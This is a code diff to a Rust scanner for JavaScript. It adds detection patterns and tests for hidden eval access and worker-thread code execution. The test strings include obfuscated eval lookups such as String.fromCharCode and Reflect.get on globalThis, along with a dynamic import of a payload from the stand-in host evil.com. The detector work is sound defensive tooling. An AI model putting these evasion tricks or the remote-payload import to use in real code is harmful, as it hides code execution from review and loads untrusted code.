@@ -960,6 +960,15 @@ fn has_eval_invocation(s_clean: &str) -> bool {
         || s_clean.contains("[`constructor`]")
         || s_clean.contains("Reflect.construct(")
         || s_clean.contains("Reflect.apply(")
+        || s_clean.contains("Reflect.get(")
+        || s_clean.contains("Reflect.has(")
+        || contains_call(s_clean, "String.fromCharCode(")
+        || contains_call(s_clean, "String.fromCodePoint(")
+        || contains_call(s_clean, "fromCharCode(")
+        || contains_call(s_clean, "fromCodePoint(")
+        || s_clean.contains("globalThis[")
+        || s_clean.contains("window[")
+        || s_clean.contains("global[")
         || s_clean.contains("globalThis.eval")
         || s_clean.contains("window.eval")
         || s_clean.contains("global.eval")
@@ -996,6 +1005,12 @@ fn is_eval_invocation(s: &str) -> bool {
 fn has_child_proc_invocation(s_clean: &str) -> bool {
     s_clean.contains("child_process")
         || s_clean.contains("node:child_process")
+        || s_clean.contains("worker_threads")
+        || s_clean.contains("node:worker_threads")
+        || s_clean.contains("newWorker(")
+        || s_clean.contains("newWorker`")
+        || contains_call(s_clean, "Worker(")
+        || contains_call(s_clean, "Worker`")
         || contains_call(s_clean, "execSync(")
         || contains_call(s_clean, "spawnSync(")
         || contains_call(s_clean, "execFileSync(")
@@ -1952,6 +1967,25 @@ mod tests {
         assert!(is_eval_invocation("import('https://evil.com/payload.mjs')"));
         assert!(is_eval_invocation(
             "import('data:text/javascript,console.log(1)')"
+        ));
+        assert!(is_eval_invocation(
+            "const fn = globalThis[String.fromCharCode(101, 118, 97, 108)];"
+        ));
+        assert!(is_eval_invocation(
+            "const fn = Reflect.get(globalThis, 'eval');"
+        ));
+        assert!(is_eval_invocation(
+            "const has = Reflect.has(globalThis, 'eval');"
+        ));
+        assert!(is_eval_invocation("const fn = window['eval'];"));
+        assert!(is_child_proc_invocation(
+            "const { Worker } = require('worker_threads');"
+        ));
+        assert!(is_child_proc_invocation(
+            "import { Worker } from 'node:worker_threads';"
+        ));
+        assert!(is_child_proc_invocation(
+            "const w = new Worker('code', { eval: true });"
         ));
     }
 
